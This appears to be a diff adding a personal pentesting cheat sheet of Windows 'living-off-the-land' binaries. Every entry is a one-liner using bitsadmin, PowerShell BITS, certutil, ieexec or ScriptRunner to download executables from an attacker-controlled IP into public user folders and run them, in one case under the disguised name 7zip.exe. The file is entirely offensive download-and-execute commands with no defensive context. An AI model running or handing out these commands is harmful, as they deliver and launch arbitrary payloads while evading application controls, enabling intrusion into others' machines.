@@ -1,0 +1,30 @@
+LOLBINS
+Download with BitsAdmin
+"bitsadmin.exe  /transfer /Download /priority Foreground  http://10.10.14.6:80/autoruns.exe C:\Users\Public\documents\autoruns.exe"
+
+
+Powershell Download BitsAdmin
+"Start-BitsTransfer -Priority foreground -Source http://10.10.14.6:80/autoruns.exe  -Destination C:\Users\Public\autoruns.exe"
+
+
+Run Multiple Commands (download and execute) BitsAdmin
+"bitsadmin.exe  /transfer /Download /priority Foreground  http://10.10.14.6:80/autoruns.exe C:\Users\Public\music\autoruns.exe && C:\Users\Public\music\autoruns.exe"
+
+"bitsadmin.exe  /transfer /Download /priority Foreground  http://10.10.14.6:80/autoruns.exe C:\Users\Public\music\autoruns.exe | cmd /c  C:\Users\Public\music\autoruns.exe"
+
+Download With Certutil
+"certutil.exe -urlcache -split -f http://10.10.14.5/autoruns.exe C:\Users\Public\Documents\7zip.exe"
+
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+
+Download and Execute with CertUtil
+"certutil.exe -urlcache -split -f http://10.10.14.5/autoruns.exe C:\Users\Public\Documents\7zip.exe | cmd /c C:\Users\Public\Documents\7zip.exe"
+
+
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+
+Execute with ScriptRunner.exe 
+
+C:\Windows\System32\ScriptRunner.exe -appvscript "\\fileserver\calc.cmd" 
+C:\Windows\System32\ScriptRunner.exe -appvscript powershell.exe -args
+
